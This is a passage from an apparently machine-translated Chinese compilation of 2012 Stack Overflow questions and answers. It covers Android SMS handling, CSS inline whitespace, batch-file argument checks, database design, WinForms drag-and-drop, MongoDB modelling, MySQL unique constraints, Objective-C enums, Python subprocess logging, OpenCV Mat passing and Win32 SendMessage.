Cursor c = getContentResolver().query(personUri, new String[] { PhoneLookup.DISPLAY_NAME }, null, null, null );  
if( c.moveToFirst() ) {  
             int nameIndex = c.getColumnIndex(PhoneLookup.DISPLAY_NAME);  
             contactName = c.getString(nameIndex);
}
c.close();
cur.close();

String out = "";
Date d = new Date(Long.valueOf(time)); 

if (protocol == null)
    out = "Sending to: "+ contactName + " <"+add +">\nDate: "+d +"\nBody: "+body+"\n\n";
else 
    out = "Received from: "+ contactName + " <"+add +">\nDate: "+d +"\nBody: "+body+"\n\n";

tv.setText(out);
setContentView(tv);

} 
```

有什么方法可以将它合并到我的广播接收器（SmsReceiver.java）中？希望有一种方法可以触发事件，以便在收到新消息时可以将预定义消息插入与收件箱中最新文本消息相关的对话中。

当我在做的时候。有什么方法可以在不要求用户手动输入的情况下准确地检索本地电话号码？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T18:38:19.310

在我的接收器中使用以下代码解决。

```
ContentValues values = new ContentValues();
 values.put("address", "0123456789");
 values.put("body", "Message goes here");
  context.getContentResolver().insert(Uri.parse("content://sms/"), values); 
```

# css - 如何在不操作 HTML 的情况下摆脱跨度之间的空白？

> ID：11235151
> 
> 赞同：4
> 
> 时间：2012-06-27T21:37:44.653
> 
> 标签：css, whitespace, html

这是我的下拉菜单代码。我从产生这个的教程中提取了代码：[http ://www.webdesigndev.com/wp-content/uploads/2009/07/fancydropdown.html](http://www.webdesigndev.com/wp-content/uploads/2009/07/fancydropdown.html)

但是我有图像而不是文本导航，正如您在附加到跨度 ID 的 CSS 中看到的那样。使用此代码，我正确地为每个跨度提供了下拉菜单，我只是无法摆脱它们之间的空白。

我知道 div/spans 之间的 HTML 中的新行创建了空格，但我想知道在 CSS 中摆脱它们的方法。

```
<div id="menu">
<ul class="tabs">
<li class="hasmore"><a href="#"><span id="bird"></span></a>
    <ul class="dropdown">
        <li><a href="#">Menu item 1</a></li>
        <li><a href="#">Menu item 2</a></li>
        <li class="last"><a href="#">Menu item 6</a></li>
    </ul></li><li class="hasmore"><a href="#"><span id="wild"></span></a>
    <ul class="dropdown">
        <li><a href="#">Menu item 1</a></li>
        <li><a href="#">Menu item 2</a></li>
        <li class="last"><a href="#">Menu item 6</a></li>
    </ul>
</li>

</ul>
</div> 
```

这是一些适用的 CSS：

```
#menu ul
{
margin: 0 auto;
}

ul.tabs
{
display: table;
margin: 0;
padding: 0;
list-style: none;
position: relative;
}

ul.tabs li
{
margin: 0;
padding: 0;
list-style: none;
display: table-cell;
float: left;
position: relative;
}

ul.tabs a
{
position: relative;
display: block;
}

#bird {
background-image:url(images/birdingnav.png);
width:80px;
height: 20px;
text-indent:-9009px;
font-size: 0px;
border: 0;
}

#wild {
background-image:url(images/wildernessnav.png);
width:119px;
height: 20px;
text-indent:-9009px;
font-size:0px;
border: 0;
} 
```

我需要对 CSS 中的这段代码做些什么来消除跨度图像之间出现的空白？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-06-27T22:27:11.360

这是一个常见的问题。`inline-block`than更常见`inline`，`inline`通常意味着它在文本流中，其中空白是相关的。有了`inline-block`，人们将它用于布局，空白成为一个问题。

有一个新的 CSS 属性专门试图处理这个问题 -`white-space:collapse;`和`white-space-collapse: discard;`，但遗憾的是它还没有得到任何主要浏览器的支持。所以这不是一个选择。

如果没有这个，解决方案往往有点老套。

一种常见的解决方案是将容器元素设置为`font-size:0;`. 这有效地使空白变得无关紧要；它仍然存在，但不占用任何空间。这里的缺点是您需要再次为内部元素设置字体大小。如果您使用`em`基于字体大小的动态布局，则处理起来可能会很棘手。

将布局切换为`float:left`布局将消除此问题，但会引入其他问题。就个人而言，我从不喜欢使用 float，但它可能是某些情况下的答案。

您也可以使用 Javascript 来删除空格，但这确实是一个 hack。

除此之外，重新排列 HTML 代码以删除空格是最可能的最佳解决方案。我知道这不是你想要的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-27T22:13:14.853

尝试设置`display: inline-block`图像元素。跨度应该是内联的，所以最好的解决方案是根本不使用跨度，但是既然你说不要改变html......

看看这个小提琴中的图像之间如何没有空格：http: [//jsfiddle.net/rVTZc/](http://jsfiddle.net/rVTZc/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-27T22:05:54.737

从这种风格：

```
#menu ul li a:hover span {
    background: url("images/topselectionright.png") repeat scroll right top transparent;
} 
```

消除

```
right top 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-27T22:07:12.253

如果我理解正确，也许`ul { font-size:0 }`会有所帮助？

# string - 如何查找字符串是否在 DOS 批处理文件的字符串列表中

> ID：11235153
> 
> 赞同：9
> 
> 时间：2012-06-27T21:37:53.117
> 
> 标签：string, batch-file, dos

我想根据字符串列表检查批处理文件的参数是否有效。

例如：

```
IF %1 IN validArgument1, validArgument2, validArgument3 SET ARG=%1 
```

只有当它匹配时，这才会将 ARG 设置为有效参数之一。理想情况下不区分大小写。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-28T02:51:07.547

您也可以使用*数组*方法：

```
setlocal EnableDelayedExpansion

set arg[1]=validArgument1
set arg[2]=validArgument2
set arg[3]=validArgument3

for /L %%i in (1,1,3) do if /I "%1" equ "!arg[%%i]!" SET "ARG=!arg[%%i]!" 
```

在我看来，这种方法更清晰，更易于管理多个选项。例如，您可以通过以下方式创建有效参数数组：

```
set i=0
for %%a in (validArgument1 validArgument2 validArgument3) do (
   set /A i+=1
   set arg[!i!]=%%a
) 
```

* * *

另一种可能性是为每个有效参数定义一个变量：

```
for %%a in (validArgument1 validArgument2 validArgument3) do set %%a=1 
```

...然后以这种方式检查参数：

```
if defined %1 (
   echo %1 is valid option...
   SET ARG=%1
) 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-06-27T22:06:33.093

一种稳健的方法是使用延迟扩展

```
setlocal enableDelayedExpansion
set "validArgs=;arg1;arg2;arg3;"
if "!validArgs:;%~1;=!" neq "!validArgs!" set ARG=%1 
```

也可以使用 CALL 和普通扩展来完成，但它更有可能失败，具体取决于参数的值。

```
set "validArgs=;arg1;arg2;arg3;"
call set "test=%%validArgs:;%~1;=%%"
if "%test%" neq "%validArgs%" set ARG=%1 
```

上述两种技术都有一个限制，即没有有效的 arg 可以包含`=`并且 args 不能以`*`.

您也可以使用以下蛮力方法，只要没有有效参数包含`*` `?` `,` `;` `=`或`<space>`

```
set "validArgs=arg1;arg2;arg3"
for %%A in (%validArgs%) if /i "%~1"=="%%A" set ARG=%1 
```

您可能想看看这个[参数解析器](https://stackoverflow.com/a/8162578/1012053)。您可以修改该代码，或者它可能会为您自己的独特策略激发一些想法。

# .net - 用于在 UI 中呈现的分析数据的数据库结构和体系结构

> ID：11235159
> 
> 赞同：0
> 
> 时间：2012-06-27T21:38:30.027
> 
> 标签：.net, sql, sql-server, database

我需要一些建议或安慰...

我们正在开发一个基于 Web 的酒店分析应用程序 (ASP.NET)。该页面有不同的部分，显示前一晚和过去历史的特定酒店位置（总销售额、客房营业额等）的不同图表

该数据可以在夜间作业（存储过程）中运行以填充表，因为数据不必是最新的。昨天的数据是不需要实时的。页面中的每个分析部分是否应该让数据来自数据库中由该存储过程填充的特定表（存储过程最初会从它需要的多个表中获取信息）？还是每个分析部分都有自己的表格用于隔离目的更好？例如，关于总销售额的所有数据都应该在一个表中，而营业额信息应该在另一个表中。

由于数据有所不同，我正在辩论并走向每个人都有自己的表格。将所有数据放在一个表中意味着会有很多带有空值的单元格。但是话又说回来，随着新的分析需求的出现，这意味着添加更多的表......

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-27T21:52:04.623

您需要将分析与界面分开。这里的关键是“实体”。同一实体上的度量值应位于同一个表中。因此，您应该将有关酒店位置的所有信息放入同一张表中。

您将拥有一组相互关联的列。例如，与酒店入住率相关的所有列可能是一个组，而另一组可能是销售。我建议为这些列添加前缀以识别它们的主题。类似于“occ_”的占用和“sales_”的销售。

我建议对这些进行结构化，以便每个主题都在其自己的存储过程中。如果可能的话，我会使用知名视图来创建要添加到大表中的信息。

您可能拥有其他级别的其他信息，例如地理信息。此信息将位于不同的表中。

如果您想要钻取功能，这可能会变得更加复杂。但是，你没有问这个。

一件重要的事情要记住。当您开始设计应用程序时，您可能在不同的列之间有非常清晰的界限。但是，用户将开始模糊线条并将不同的元素组合在一起。毕竟，这就是分析和数据可视化的力量。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-27T21:43:09.387

这称为数据结构的标准化。

您不想要一个包含所有内容的大表（包括一堆空值）

您确实希望每个主要逻辑概念都有一个表，然后再用一些表将它们在逻辑上链接在一起。

如果您想要关于如何拆分事物的更具体的想法 - 然后使用您认为要存储的一些列编辑您的问题 - 作为起点。

# c# - 富文本框图像拖放不显示图像

> ID：11235161
> 
> 赞同：0
> 
> 时间：2012-06-27T21:38:40.747
> 
> 标签：c#, winforms, richtextbox

我有一个简单的页面。一个富文本框绑定到我的数据库中的测试表。

我已将 EnableAutoDragDrop 设置为 true。

一切都很好，盒子里的东西都被保存了，可以在需要时拉回来。

我的问题是将图像放入 RTB。如果我直接从文件管理器（任何类型的图像文件）中拖动它们，那么我会得到一个带有显示文件名的图标，而不是实际图像。

如果我打开 Word 并将图像拖放到 Word 中，然后将其拖到 RTB 中，则图像显示得很好。

我想我不了解文件管理器和 word 和我的 RTB 之间的过程机制。谁能解惑我？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-27T23:07:30.990

@climbage 提供的答案有很好的解释。这里是如何在 RichTextBox 中实现拖放

![输出](../Images/38ccf18dfe0ed6a43ea18cc1154d1564.png)

代码：

```
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

namespace rich_RichtextboxDragDrop
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            AllowDrop = true;
            this.richTextBox1.DragEnter += new DragEventHandler(richTextBox1_DragEnter);
            this.richTextBox1.DragDrop += new DragEventHandler(richTextBox1_DragDrop);
        }
        void richTextBox1_DragEnter(object sender, System.Windows.Forms.DragEventArgs e)
        {

            if ((e.Data.GetDataPresent(DataFormats.FileDrop)))
            {
                e.Effect = DragDropEffects.Copy;
            }
        }
        void richTextBox1_DragDrop(object sender, System.Windows.Forms.DragEventArgs e)
        {
            Image img = default(Image);
            img = Image.FromFile(((Array)e.Data.GetData(DataFormats.FileDrop)).GetValue(0).ToString());
            Clipboard.SetImage(img);

            this.richTextBox1.SelectionStart = 0;
            this.richTextBox1.Paste();
        }
    }

} 
```

**编辑以获取更多信息**

这就是您在“属性”选项卡中看不到它的原因。[Attribute](http://msdn.microsoft.com/en-us/library/system.attribute.aspx) `[Browsable(false)]`告诉`PropertyGrid`不要显示该属性。这是来自 MSDN 的源代码。

```
 /// <include file='doc\RichTextBox.uex' path='docs/doc[@for="RichTextBox.DragEnter"]/*' /> 
    /// <devdoc>
    ///     RichTextBox controls have built-in drag and drop support, but AllowDrop, DragEnter, DragDrop 
    ///     may still be used: this should be hidden in the property grid, but not in code
    /// </devdoc>
    [Browsable(false)]
    public new event DragEventHandler DragEnter { 
        add {
            base.DragEnter += value; 
        } 
        remove {
            base.DragEnter -= value; 
        }
    } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-27T22:09:53.373

拖动事件可以包含多种格式类型，由拖动事件的来源决定。当我将图像 (.png) 从文件系统拖动到 C# 控件时，我得到了这组可用格式（*请注意，您可以从中获取这些`DragEventArgs.Data.GetFormats()`*格式）

```
Shell IDList Array
Shell Object Offsets
DragImageBits
DragContext
InShellDragLoop
FileDrop
FileNameW
FileName 
```

现在，当我将相同的图像拖到 word 上，然后拖到我的 C# 控件上时，我得到了以下格式列表：

```
Woozle
Object Descriptor
Rich Text Format
HTML Format
System.String
UnicodeText
Text
EnhancedMetafile
MetaFilePict
Embed Source 
```

完全由目标控件决定如何处理拖动数据，以及使用哪种格式。MS Word 可能会采用格式`FileNameW`，即删除文件的路径，然后读取图像。虽然`RichTextBox`可能需要`FileNameW`并获取它的图标。

# jquery - jTable中“选项”下拉菜单的默认值？

> ID：11235162
> 
> 赞同：0
> 
> 时间：2012-06-27T21:38:52.963
> 
> 标签：jquery, asp.net, sql-server, jquery-jtable

我正在使用 jTable (www.jTable.org) 在 ASP.NET 中处理一个简单的网格。这是一个包含“居民”列表的页面，其中有一个名为“FacilityFrom”的字段是从数据库中的 FACILITY 表中填充的。在“居民”jTable 上，我有一个使用“选项”属性并从“设施”SQL 表中提取的字段。我只想要一个下拉列表，当您添加新记录时，第一个默认值为“（无）”。

我做了一些 MSSQL 魔术并创建了一个表示默认值的记录（它在数据库中的字段字面意思是“（无）”。然后在填充下拉列表时我做

```
select FacilityID,Name from FACILITY where Name = '(NONE)'
UNION
select FacilityID,Name from FACILITY where Name <> '(NONE)' 
```

我意识到它很丑（我设置了必要的唯一约束以使其密封），但查询按预期工作并将“（NONE）”选项放在顶部；但无论出于何种原因，jTable 都在自己做一些排序魔术并将其放在底部！即使我颠倒了上面的选择语句，它仍然在底部吗？即使我在名为 GetFacilityOptions 的 WebMethod 中放置了一个断点 - 很明显，结果就是我想要的 - (NONE) 总是在列表中的索引 0 处。似乎 jquery 绑定中的某些东西正在改变？

无论如何，我在 jTable 文档上找到了 defaultValue 属性，并认为它可以解决我的问题，但它仍然没有影响？HTML 如下：

```
 FacilityFromID: {
                             title: 'Facility',
                             options: '/Residents.aspx/GetFacilityOptions',
                             defaultValue: '(NONE)'
                         }, 
```

后面的代码是：

```
 [WebMethod(EnableSession = true)]
        public static object GetFacilityOptions()
        {
            try
            {
                var facilities = BusinessObjects.DataAcesss.GetAllFacilities().Select(c => new { DisplayText = c.Name, Value = c.FacilityID });
                //BREAKPOINT SAYS '(NONE)' IS AT INDEX 0 HERE!!
                return new { Result = "OK", Options = facilities };
            }
            catch (Exception ex)
            {
                return new { Result = "ERROR", Message = ex.Message };
            }
        } 
```

有人有任何想法/建议吗？非常感谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-12-22T08:48:45.877

```
,  min_id: {
 title: field name,
  options: the options function,
 defaultValue: $('#<% = ddlMin.ClientID %>').val() // where ddlMin.ClientID the value required
} 
```

# mongodb - 如何在 MongoDB 中建模“签入”样式对象？

> ID：11235164
> 
> 赞同：0
> 
> 时间：2012-06-27T21:39:03.980
> 
> 标签：mongodb, relational-database, data-modeling, has-many-through

我正在 MongoDB 中制作一个新应用程序，我发现面向文档的建模风格非常适合我的所有模型。

但是，我的一个绊脚石是“签入”式操作。用户可以在某个位置签到，我需要为每次签到存储以下内容：

*   用户身份
*   地点编号
*   入住日期

现在通常我只是将它作为嵌入存储在用户文档下，但我经常想问以下问题：

*   用户签到的所有地方都在哪里？
*   在某个地方发生的所有签到是什么？
*   给定用户位置组合的所有签到？
*   用户的所有签到或特定时间范围内的地点？

在关系数据库中，这令人尖叫`has-many through`，但在 Mongo 中，这并不是那么明显的关系。我是否应该让 Checkin 成为顶级对象并接受连接式查询的性能影响？随着时间的推移，我可能还需要向签入对象添加字段，因此我希望保持解决方案的灵活性。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-27T22:04:00.733

是的。如果您将签到作为数组嵌入到用户文档中，那么查询“10 最近签到一个地方”几乎是不可能的。同样，如果您嵌入到位，“用户最近签到 10 次”将非常困难。所以让 checkins 成为它自己的集合。

如果您在 checkins 集合中同时索引 userid 和 placeid，您的查询应该足够快。例如，要查找用户 Jesse 最近的签到，请按名称查找用户以查找 Jesse 的 _id，然后查询该用户 ID 的签到。这只是两个查询。对于一个地方的最近签到也是如此。

如果您查询某个地点的最近签到并想要用户名，您可以首先查询签到集合以获取用户 ID 列表，然后使用 $in 查询获取所有用户文档。同样，这只是两个查询，如果您创建正确的索引，两个查询都会被完全索引。

# service - 如何使用亚马逊商城网络服务 (MWS) 获取商品已售出通知

> ID：11235172
> 
> 赞同：2
> 
> 时间：2012-06-27T21:39:43.007
> 
> 标签：service, web, amazon, marketplace

我想以编程方式获取亚马逊市场上列出的商品的商品已售通知。有没有办法使用 MWS API 来做到这一点？我浏览了文档，并没有找到任何接近的东西。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-11-24T23:48:00.173

嗨，我知道这是旧的，提出问题的用户可能不活跃。

虽然以防万一有人登陆这里，但我想说的是，在撰写本文时，此 MWS 不支持已售商品通知（将来可能会这样做），目前唯一支持的通知是“AnyOfferChanged”。 [更多信息](https://images-na.ssl-images-amazon.com/images/G/01/mwsportal/doc/en_US/subscriptions/MWSSubscriptionsApiReference._V356512412_.pdf)

获取订单的方法是调用 ListOrders 服务，更多信息 [在这里](https://images-na.ssl-images-amazon.com/images/G/01/mwsportal/doc/en_US/orders/MWSOrdersApiReference._V384929319_.pdf)

希望这对任何人都有帮助

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-07T11:11:40.393

您必须使用亚马逊的 MWS 服务。

您将在此网站上找到所有文档、api 和信息：[https](https://developer.amazonservices.com/) ://developer.amazonservices.com/ 。

您必须对他们的网络服务的调用进行编码并处理响应。

有一个“订单”调用可以加载，例如使用 cron 来获取任何新订单。这是[订单 api 调用](http://docs.developer.amazonservices.com/en_US/orders/2013-09-01/index.html)。

我希望这会有所帮助。麦克风

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-05-22T17:38:16.350

查看`FulfillmentOrderStatus`通知类型的描述

[https://docs.developer.amazonservices.com/en_UK/subscriptions/Subscriptions_NotificationType.html](https://docs.developer.amazonservices.com/en_UK/subscriptions/Subscriptions_NotificationType.html)

# mysql - 防止 MySQL 重复插入

> ID：11235173
> 
> 赞同：4
> 
> 时间：2012-06-27T21:39:47.830
> 
> 标签：mysql

我有一个带有自动递增键的 mysql 表。如果表不包含我要插入的行，我需要一种仅插入该表的方法。INSERT IGNORE 和 INSERT ON DUPLICATE KEY UPDATE 不起作用，因为自动递增的键将导致行始终不同。只有在没有重复行的情况下才能插入以下行的另一种方法是什么？谢谢。

```
INSERT INTO TableName (column1, column2, column3) VALUES ("value1", "value2", "value3"); 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-27T21:41:22.620

`UNIQUE`对您需要唯一的任何列或列的组合设置约束。

例如：

```
ALTER TABLE `TableName`
ADD UNIQUE `constrain_me` (`column1`, `column2`); 
```

如果您想忽略重复插入可能给出的任何错误，请使用`INSERT IGNORE`，尽管您可能希望捕获此错误而不是将其隐藏在地毯下。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-27T21:45:43.230

您可以在不想重复的字段上创建唯一索引。

```
CREATE UNIQUE INDEX MyIndex ON column1 
```

这样，如果添加了重复值，查询就会出错。还值得注意的是，此方法确实允许添加 NULL 值（即具有 NULL column1 值的两行不会算作重复）

# objective-c - 带有 case/switch 的 Objective C 全局常量

> ID：11235174
> 
> 赞同：3
> 
> 时间：2012-06-27T21:39:49.043
> 
> 标签：objective-c, ios, constants, switch-statement

有什么方法可以在 Objective C 中使用在 case/switch 语句中工作的全局 int 常量？这里的技术（http://stackoverflow.com/questions/538996/constants-in-objective-c）让我可以在任何地方访问常量，但不允许我将它们放入 switch 语句中。

在.h

```
FOUNDATION_EXPORT const int UNIT_IDLE;
FOUNDATION_EXPORT const int UNIT_DEFEND; 
```

米

```
int const UNIT_IDLE = 0;
int const UNIT_DEFEND = 1; 
```

错误是“表达式不是整数常量表达式”

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-27T21:52:16.533

在使用将在 switch 语句中使用的常量时，我​​通常将枚举与 typedef 语句一起使用。

例如，这将在 ProjectEnums.h 等共享 .h 文件中：

```
enum my_custom_unit
{
    MyCustomUnitIdle    = 1,
    MyCustomUnitDefend  = 2
};
typedef enum my_custom_unit MyCustomUnit; 
```

然后，我可以在我的 .c、.m、.cpp 文件中使用类似于以下 switch 语句的代码：

```
#import "ProjectEnums.h"

- (void) useUnit:(MyCustomUnit)unit
{
    switch(unit)
    {
        case MyCustomUnitIdle:
        /* do something */
        break;

        case MyCustomUnitDefend:
        /* do something else */
        break;

        default:
        /* do some default thing for unknown unit */
        break;
    };
    return;
}; 
```

这也允许编译器在编译时验证传递给方法并在 switch 语句中使用的数据。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-27T21:51:51.697

我认为您最好的选择是使用`enum types`. 只需在头文件中声明一个类型，然后您就可以在 switch 语句中使用它了。

**类.h**

```
typedef enum{
    kEditGameModeNewGame = 0,
    kEditGameModeEdit = 1
}eEditGameMode; 
```

**类.m**

```
eEditGameMode mode = kEditGameModeEdit;

switch (mode) {
    case kEditGameModeEdit:
        // ...
        break;
    case kEditGameModeNewGame:
        // ...
        break;

    default:
        break;
} 
```

祝你好运！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-27T22:08:30.560

[官方指南](http://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/CodingGuidelines/Articles/NamingIvarsAndTypes.html)说您应该使用“具有整数值的相关常量组的枚举”。这可能会解决您的问题并改进代码。

# python - Python subprocess.check_call - 如何将stdout和stderr定向到_bo th_屏幕和日志文件？

> ID：11235175
> 
> 赞同：4
> 
> 时间：2012-06-27T21:40:02.557
> 
> 标签：python, subprocess

我使用 Python 2.7。这是我目前正在做的从 Python 启动其他程序，将 STDOUT 和 STERR 重定向到 LOGFILE：

```
 try:
    # Execute command and print content to LOGFILE
        tempname = os.path.abspath('./text.txt')
        TEMPFILE = open(tempname, 'wb')
        print 'Executing: ', command
        subprocess.check_call(command, shell = True, stdout = TEMPFILE, stderr = TEMPFILE)
        TEMPFILE.close()
        LOGFILE.write(open(tempname, 'rU').read())
        LOGFILE.close()
        os.remove(tempname)
    except Exception as errmsg:
    # If fails then print errors to LOGFILE
        TEMPFILE.close()
        LOGFILE.write(open(tempname, 'rU').read())
        os.remove(tempname)
        print messages.crit_error_bad_command % command, '\n', str(errmsg)
        print >> LOGFILE, messages.crit_error_bad_command % command, '\n', str(errmsg)
        LOGFILE.close() 
```

首先，我不确定我上面的脚本是最好的解决方案。我不得不使用临时文件，因为即使在 subprocess.check_call 调用失败的情况下我也想捕获日志。如果您有想法如何改进上述脚本，我将不胜感激。

此外，我想更改此设置，以便 STDOUT 和 STDERR 正常显示在屏幕上，并且也显示到日志文件中。我该怎么做呢？请注意，如果我不指定 STDOUT，我会看到类似“有错误，您希望继续 [y/n]？”之类的内容。在屏幕上，然后我可以对它做出反应。现在因为一切都进入日志，我在屏幕上看不到任何东西。我在这里的问题的答案应该有助于解决这个问题。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T03:18:34.397

> 我会看到诸如“出现错误，您要继续 [y/n] 吗？”之类的内容。在屏幕上，然后我可以对它做出反应。

要重定向子进程的标准输出并手动或使用预定义的答案与进程交互，您可以使用[pexpect](http://www.noah.org/wiki/Pexpect)：

```
from contextlib import closing
import pexpect

with open('text.txt', 'rb') as logfile:
    with closing(pexpect.spawn(command, logfile=logfile)) as child:
        # call here child.expect(), child.sendline(), child.interact(), etc 
```

使用 实现相同的功能`subprocess.Popen`并[非易事](https://stackoverflow.com/a/4335903/4279)。

# c# - 迁移到存储库时遇到问题（在此上下文中仅支持原始类型（'例如 Int32、String 和 Guid'））

> ID：11235179
> 
> 赞同：0
> 
> 时间：2012-06-27T21:40:03.150
> 
> 标签：c#, asp.net-mvc-3, linq, entity-framework

我正在尝试将 LINQ 到实体查询移动到使用存储库而不是直接使用 DbContext。我遇到的问题之一是给我错误的查询： `"only primitive types ('such as Int32, String, and Guid') are supported in this context)"`

这就是我正在尝试的：

```
var data = from SurveyResponseModel in surveyResponseRepository.Query
    group SurveyResponseModel by SurveyResponseModel.MemberId into resultCount
    select new ResultsViewModel()
    {
        MemberId = resultCount.Key,
        PatientFollowUpResult = surveyResponseRepository.Query.Count(r => r.PatientFollowUp),
        PatientFollowUpResultPct = (int)Math.Round(((decimal)surveyResponseRepository.Query.Count(r => r.PatientFollowUp) / (decimal)totalResponsesResult) * 100),

        ChangeCodingPracticeResult = surveyResponseRepository.Query.Count(r => r.ChangeCodingPractice),
        ChangeCodingPracticeResultPct = (int)Math.Round(((decimal)surveyResponseRepository.Query.Count(r => r.ChangeCodingPractice) / (decimal)totalResponsesResult) * 100),

        EnhanceDiagnosticAcumenResult = surveyResponseRepository.Query.Count(r => r.EnhanceDiagnosticAcumen),
        EnhanceDiagnosticAcumenResultPct = (int)Math.Round(((decimal)surveyResponseRepository.Query.Count(r => r.EnhanceDiagnosticAcumen) / (decimal)totalResponsesResult) * 100)
    } 
```

这是我的调查响应模型：

```
public class SurveyResponseModel
    {
        [Key]
        public int ResponseId { get; set; }

        public int MemberId { get; set; }

        public int ProgramId { get; set; }

        // "If yes, what changes did you make? Mark all that apply."

        [DisplayName("Did you make any changes in your practice, research, or administration activities as a result of participating in this CME activity?")]
        public string CmeChanges { get; set; }

        [DisplayName("Better patient follow-up")]
        public bool PatientFollowUp { get; set; }

        [DisplayName("Change my coding practice")]
        public bool ChangeCodingPractice { get; set; }

        [DisplayName("Enhance my diagnostic acumen")]
        public bool EnhanceDiagnosticAcumen { get; set; }
} 
```

这是显示数据的 ViewModel：

```
public int MemberId { get; set; }

public int ProgramId { get; set; }

// "If yes, what changes did you make? Mark all that apply."

[DisplayName("Did you make any changes in your practice, research, or administration activities as a result of participating in this CME activity?")]
public string CmeChangesResult { get; set; }

[DisplayName("Better patient follow-up")]
public int PatientFollowUpResult { get; set; }

public int PatientFollowUpResultPct { get; set; }

[DisplayName("Change my coding practice")]
public int ChangeCodingPracticeResult { get; set; }

public int ChangeCodingPracticeResultPct { get; set; }

[DisplayName("Enhance my diagnostic acumen")]
public int EnhanceDiagnosticAcumenResult { get; set; }

public int EnhanceDiagnosticAcumenResultPct { get; set; } 
```

查询存储库中的成员：

```
public IQueryable<SurveyResponseModel> Query
        {
            get
            {
                return dbSet.AsQueryable<SurveyResponseModel>();
            }
        } 
```

# opencv - OpenCV 在函数内更改 Mat（Mat 范围）

> ID：11235187
> 
> 赞同：8
> 
> 时间：2012-06-27T21:40:25.650
> 
> 标签：opencv

我将 Mat 传递给另一个函数并在被调用函数内更改它。我原以为它是一种更复杂的类型，它会通过引用自动传递，因此矩阵在调用函数中会发生变化，但事实并非如此。有人可以向我解释如何从函数中正确返回更改后的 Mat 吗？

这是代码片段：

```
void callingFunction(Mat img)
{
  Mat tst(100,500,CV_8UC3, Scalar(0,255,0));
  saveImg(tst, "Original image", true);
  testImg(tst);
  saveImg(tst, "Want it to be same as inside testImg but is same as Original", true);
}

void testImg(Mat img)
{
  int rs = 50; // rows
  int cs = 100; // columns
  img = Mat(rs, cs, CV_8UC3, Scalar(255,0,0));
  Mat roi(img, Rect(0, 0, cs, rs/2));
  roi = Scalar(0,0,255); // change a subsection to a different color

  saveImg(img, "inside testImg", true);
} 
```

谢谢！

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-06-27T21:59:06.800

您必须定义`Mat`为[参数引用](http://www.fredosaurus.com/notes-cpp/functions/refparams.html)(&)。这是编辑后的代码：

```
void callingFunction(Mat& img)
{
  Mat tst(100,500,CV_8UC3, Scalar(0,255,0));
  saveImg(tst, "Original image", true);
  testImg(tst);
  saveImg(tst, "Want it to be same as inside testImg but is same as Original", true);
}

void testImg(Mat& img)
{
  int rs = 50; // rows
  int cs = 100; // columns
  img = Mat(rs, cs, CV_8UC3, Scalar(255,0,0));
  Mat roi(img, Rect(0, 0, cs, rs/2));
  roi = Scalar(0,0,255); // change a subsection to a different color

  saveImg(img, "inside testImg", true);
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-01-09T12:08:42.667

我自己也想知道同样的问题，所以我想进一步澄清@ArtemStorozhuk 给出的答案（这是正确的）。

OpenCV 文档在这里具有误导性，因为看起来您是按值传递矩阵，但实际上 cv::OutputArray 的构造函数定义如下：

```
_OutputArray::_OutputArray(Mat& m) 
```

所以它通过引用获取矩阵！

由于像 cv::Mat::create 这样的操作会创建一个新矩阵，因此该操作会释放引用并将 couter 设置为 1。因此，为了将结果保留在调用函数中，您必须通过引用传递矩阵。

* * *

## 回答 #3

> 赞同：-3
> 
> 时间：2012-12-21T12:24:20.650

如果确实必须通过引用显式传递，那么所有 OpenCV 函数如何工作？它们都没有通过引用传递值，但它们似乎以某种方式写入传入的 Mat 就好了。例如，下面是 imgproc.hpp 中 Sobel 函数的声明：

```
//! applies generalized Sobel operator to the image
CV_EXPORTS_W void Sobel( InputArray src, OutputArray dst, int ddepth,
                         int dx, int dy, int ksize=3,
                         double scale=1, double delta=0,
                         int borderType=BORDER_DEFAULT ); 
```

如您所见，它传入 src 和 dst 时不带 &。然而我知道，在我用一个空的 dst 调用 Sobel 之后，它最终会被填满。不涉及'&'。

# c# - SendMessage 消失在以太中

> ID：11235189
> 
> 赞同：2
> 
> 时间：2012-06-27T21:40:35.383
> 
> 标签：c#, .net, winforms, winapi

我试图在两个应用程序之间传递消息 - 其中一个是插件，另一个是独立的配置实用程序。当我的插件检测到事件时，我想向我的实用程序发送一条消息并提示用户重新配置。

我正在使用的代码如下：

```
[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
private static extern IntPtr SendMessage(IntPtr hwnd, uint Msg, IntPtr wParam, IntPtr lParam);
private const int MESSAGE_UNAUTH = 0x401;

[... misc logic here, function def, etc]

Process[] processes = Process.GetProcessesByName("MyConfigurationApplication");

if (processes.Length > 0)
{
    foreach (Process p in processes)
    {
        SendMessage(p.MainWindowHandle, MESSAGE_UNAUTH, IntPtr.Zero, IntPtr.Zero);
    }
} 
```

